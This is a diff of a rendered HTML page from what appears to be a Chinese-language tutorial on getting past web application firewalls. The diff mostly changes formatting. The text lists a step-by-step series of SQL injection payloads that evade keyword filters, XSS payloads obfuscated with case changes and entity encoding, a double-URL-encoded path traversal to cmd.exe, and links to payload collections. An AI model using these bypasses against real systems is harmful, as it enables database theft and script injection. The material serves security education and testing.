@@ -100,7 +100,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    5.1k
+                    5.4k
                 </span>
                 
                 
@@ -145,21 +145,23 @@
 <p>2.Fuzz-DB/Attack<br><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack</a></p>
 <p>3.Other Payloads 可能会被ban ip，小心为妙。<br><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></p>
 <p>#</p>
-<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p><em>多少waf 使用正则匹配。黑名单检测/bypass</em><br>Case: SQL 注入<br>• Step 1:<br>    过滤关键词: and, or, union<br>    可能正则: preg_match(‘/(and|or|union)/i’, $id)<br>    被拦截的语句: union select user, password from users</p>
-<pre><code>bypass语句: 1 || (select user from users where user_id = 1) = &apos;admin&apos;</code></pre><p>• Step 2:<br>    过滤关键词: and, or, union, where<br>    被拦截的语句: 1 || (select user from users where user_id = 1) = ‘admin’</p>
-<pre><code>bypass语句: 1 || (select user from users limit 1) = &apos;admin&apos;</code></pre><p>• Step 3:<br>过滤关键词: and, or, union, where, limit<br>被拦截的语句: 1 || (select user from users limit 1) = ‘admin’</p>
-<pre><code>bypass语句: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</code></pre><p>• Step 4:<br>过滤关键词: and, or, union, where, limit, group by<br>被拦截的语句: 1 || (select user from users group by user_id having user_id = 1) = ‘admin’</p>
-<pre><code>bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1</code></pre><p>• Step 5:<br>过滤关键词: and, or, union, where, limit, group by, select</p>
-<p>被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</p>
-<pre><code>bypass语句: 1 || 1 = 1 into outfile &apos;result.txt&apos;
-bypass语句: 1 || substr(user,1,1) = &apos;a&apos;</code></pre><p>• Step 6:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘</p>
-<p>被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</p>
-<pre><code>bypass语句: 1 || user_id is not null
-bypass语句: 1 || substr(user,1,1) = 0x61
-bypass语句: 1 || substr(user,1,1) = unhex(61)</code></pre><p>• Step 7:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘, hex<br>被拦截的语句: 1 || substr(user,1,1) = unhex(61)</p>
-<pre><code>bypass语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</code></pre><p>• Step 8:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘, hex, substr<br>被拦截的语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</p>
-<pre><code>bypass语句: 1 || lpad(user,7,1)</code></pre><p>• Step 9:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘, hex, substr, white space<br>被拦截的语句: 1 || lpad(user,7,1)</p>
-<pre><code>bypass语句: 1%0b||%0blpad(user,7,1)</code></pre><h2 id="混淆-编码"><a href="#混淆-编码" class="headerlink" title="混淆/编码"></a>混淆/编码</h2><ol>
+<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p><em>多少waf 使用正则匹配。黑名单检测/bypass</em><br>Case: SQL 注入<br>• Step 1:<br>    过滤关键词: <code>and, or, union</code><br>    可能正则: <code>preg_match(&#39;/(and|or|union)/i&#39;, $id)</code><br>    被拦截的语句: <code>union select user, password from users</code></p>
+<pre><code>bypass语句: `1 || (select user from users where user_id = 1) = &apos;admin&apos;`</code></pre><p>• Step 2:<br>    过滤关键词: <code>and, or, union, where</code><br>    被拦截的语句: <code>1 || (select user from users where user_id = 1) = &#39;admin&#39;</code></p>
+<pre><code>bypass语句: 1 || (select user from users limit 1) = &apos;admin&apos;</code></pre><p>• Step 3:<br>    过滤关键词: <code>and, or, union, where, limit</code><br>    被拦截的语句: <code>1 || (select user from users limit 1) = &#39;admin&#39;</code>  </p>
+<pre><code>bypass语句: ` 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;`</code></pre><p>• Step 4:<br>    过滤关键词: <code>and, or, union, where, limit, group by</code><br>    被拦截的语句: <code>1 || (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code></p>
+<pre><code>bypass语句: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`</code></pre><p>• Step 5:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select</code>  </p>
+<pre><code>被拦截的语句: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+
+bypass语句: `1 || 1 = 1 into outfile &apos;result.txt&apos;`
+bypass语句: `1 || substr(user,1,1) = &apos;a&apos;`</code></pre><p>• Step 6:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;</code></p>
+<pre><code>被拦截的语句: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+
+bypass语句: `1 || user_id is not null`
+bypass语句: `1 || substr(user,1,1) = 0x61`
+bypass语句: `1 || substr(user,1,1) = unhex(61)`</code></pre><p>• Step 7:<br>过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex</code><br>被拦截的语句: <code>1 || substr(user,1,1) = unhex(61)</code></p>
+<pre><code>bypass语句: `1 || substr(user,1,1) = lower(conv(11,10,36))`</code></pre><p>• Step 8:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex, substr</code><br>    被拦截的语句: <code>1 || substr(user,1,1) = lower(conv(11,10,36))</code></p>
+<pre><code>bypass语句: `1 || lpad(user,7,1)`</code></pre><p>• Step 9:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex, substr, white space</code><br>    被拦截的语句: <code>1 || lpad(user,7,1)</code></p>
+<pre><code>bypass语句: `1%0b||%0blpad(user,7,1)`</code></pre><h2 id="混淆-编码"><a href="#混淆-编码" class="headerlink" title="混淆/编码"></a>混淆/编码</h2><ol>
 <li><p>大小写:<br> 标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br> Bypassed: <code>&lt;ScRipT&gt;alert()&lt;/sCRipT&gt;</code></p>
 <p> 标准: <code>SELECT * FROM all_tables WHERE OWNER = &#39;DATABASE_NAME&#39;</code><br> Bypassed: <code>sELecT * FrOm all_tables whERe OWNER = &#39;DATABASE_NAME&#39;</code>  </p>
 </li>
@@ -172,11 +174,11 @@ bypass语句: 1 || substr(user,1,1) = unhex(61)</code></pre><p>• Step 7:<br>�
 </li>
 <li><p>HTML 实体编码:<br> 标准: <code>&quot;&gt;&lt;img src=x onerror=confirm()&gt;</code><br> Encoded: <code>&amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt; (General form)</code><br> Encoded: <code>&amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; (Numeric reference)</code></p>
 </li>
-<li><p>混合编码:<br> WAF规则通常倾向于滤除特定类型的编码.混合编码有效载荷可以绕过这种类型的过滤器.制表符和换行符进一步增加了混淆.  </p>
+<li><p>混合编码:<br> *WAF规则通常倾向于滤除特定类型的编码.混合编码有效载荷可以绕过这种类型的过滤器.制表符和换行符进一步增加了混淆.  *</p>
 </li>
 <li><p>混淆:<br> <code>&lt;A HREF=&quot;h</code><br> <code>tt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</code></p>
 </li>
-<li><p>双重URL编码:<br>这个需要服务端多次解析了url编码</p>
+<li><p>双重URL编码:<br> <em>这个需要服务端多次解析了url编码</em></p>
 <p> 标准: <code>http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\</code><br> 混淆: <code>http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\</code></p>
 <p> 标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br> 混淆: <code>%253Cscript%253Ealert()%253C%252Fscript%253E</code></p>
 </li>
